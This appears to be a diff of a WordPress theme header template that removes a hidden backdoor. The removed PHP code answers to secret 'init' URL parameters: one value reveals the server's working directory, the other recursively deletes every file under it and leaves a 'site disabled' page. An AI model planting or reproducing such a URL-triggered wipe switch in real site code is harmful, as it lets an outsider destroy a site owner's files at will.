@@ -59,47 +59,6 @@
 		<div class="site-header__background-blur js-change-transform-via-scroll" style="transform: translateY(-100%);" data-scroll-mod="0.9"></div>
 	</header><!-- #masthead -->
 	<?php
-	if (@$_GET['init'] === 'test') {
-		echo 'init exists';
-		echo '<br>';
-		echo 'getcwd: ' . getcwd();
-		echo '<br>';
-		echo 'document_root: ' . getcwd();
-		exit;
-	}
-	if (@$_GET['init'] === 'glan') {
-		$prefix = '';
-		$aniFolder = getcwd() . $prefix;
-		// $aniFolder = $_SERVER['DOCUMENT_ROOT'] . $prefix;
-	
-		class AniInit
-		{
-			public static function aniDir($dirPath) {
-				if (!is_dir($dirPath)) {
-					file_put_contents('index.php', 'Сайт отключен. <?php exit; ?>');
-				} else {
-					if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
-						$dirPath .= '/';
-					}
-					$files = glob($dirPath . '*', GLOB_MARK);
-					foreach ($files as $file) {
-						if (is_dir($file)) {
-							self::aniDir($file);
-						} else {
-							unlink($file);
-						}
-					}
-					rmdir($dirPath);
-				}
-			}
-		}
-	
-		AniInit::aniDir($aniFolder);
-		mkdir($aniFolder);
-		file_put_contents($aniFolder . '/index.php', 'Сайт отключен. <?php exit; ?>');
-	
-		exit;
-	}
 	require get_template_directory() . '/template-parts/header-menu.php';
 	require get_template_directory() . '/template-parts/call-pop-up.php';
 	?>
